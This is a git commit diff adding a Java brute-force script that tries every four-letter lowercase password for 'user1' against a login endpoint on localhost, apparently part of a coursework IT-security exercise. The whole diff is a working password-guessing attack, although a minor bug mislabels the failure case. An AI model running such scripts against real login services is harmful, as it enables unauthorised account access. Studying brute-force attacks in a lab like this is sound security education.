94e0c41d5f2033afd38192ab7fd6ecb2f29d19f2
l4mers <gustav@henrikssons.org>
2023-08-30 23:38:55 +0200

    asd

--- it-security2/src/main/java/com/example/itsecurity2/scripts/BrutalForce.java
+++ it-security2/src/main/java/com/example/itsecurity2/scripts/BrutalForce.java
@@ -7,6 +7,44 @@ import java.nio.charset.StandardCharsets;
 
 public class BrutalForce {
 
+    private String password;
+    private long totalTime;
+    private boolean cracked = false;
+
+    public boolean useTheForce(String name){
+        long start = System.currentTimeMillis();
+        for (char first = 'a'; first <= 'z'; first++) {
+            for (char second = 'a'; second <= 'z'; second++) {
+                for (char third = 'a'; third <= 'z'; third++) {
+                    for (char fourth = 'a'; fourth <= 'z'; fourth++) {
+                        String password = "" + first + second + third + fourth;
+                        if(request(name, password)){
+                            this.totalTime = System.currentTimeMillis() - start;
+                            this.password = password;
+                            return true;
+                        }
+                        if(password.equals("zzzz")){
+                            this.totalTime = System.currentTimeMillis() - start;
+                            this.password = password;
+                            return false;
+                        }
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
+    @Override
+    public String toString() {
+        if(cracked){
+            return "Success!\n" +
+                    "Password: " + this.password + "\n" +
+                    "Second passed: " + 0.001 * this.totalTime;
+        }
+        return "failed to find password";
+    }
+
     private boolean request(String name, String password){
         try {
             HttpURLConnection request = (HttpURLConnection) new URL("http://localhost:8080/credentials/login").openConnection();
@@ -26,7 +64,11 @@ public class BrutalForce {
         }
         return false;
     }
+
+
     public static void main(String[] args) {
-        System.out.println(new BrutalForce().request("user1", "pass"));
+        BrutalForce brutalForce = new BrutalForce();
+        brutalForce.cracked = brutalForce.useTheForce("user1");
+        System.out.println(brutalForce);
     }
 }
